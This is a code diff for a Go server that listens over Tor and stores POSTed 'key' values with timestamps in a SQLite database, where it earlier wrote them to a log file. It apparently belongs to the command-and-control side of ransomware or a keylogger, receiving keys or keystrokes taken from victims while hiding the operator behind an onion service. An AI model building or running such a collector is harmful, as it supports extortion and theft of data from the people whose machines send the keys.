@@ -5,10 +5,13 @@ import (
 	"fmt"
 	"log"
 	"net/http"
-	"os"
 	"time"
 
 	"github.com/cretz/bine/tor"
+
+	"database/sql"
+
+	_ "github.com/mattn/go-sqlite3"
 )
 
 func main() {
@@ -63,16 +66,29 @@ func listener(w http.ResponseWriter, r *http.Request) {
 
 		key := r.PostFormValue("key")
 		fmt.Println(key)
-		f, err := os.OpenFile("key.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err != nil {
-			log.Println(err)
-		}
-		if _, err := f.WriteString(key + "\n"); err != nil {
-			log.Println(err)
-		}
-		defer f.Close()
+		writeDatabase(key)
 
 	default:
 		fmt.Fprintf(w, "Tssss")
+	}
+}
+
+func writeDatabase(key string) { // Add error management
+
+	db, err := sql.Open("sqlite3", "./key.db")
+
+	checkErr(err)
+
+	statement, err := db.Prepare("INSERT INTO keys(timestamp, key) values(?,?)")
+	checkErr(err)
+
+	statement.Exec(fmt.Sprint(time.Now().Unix()), key)
+	db.Close()
+
+}
+
+func checkErr(err error) {
+	if err != nil {
+		panic(err)
 	}
 }
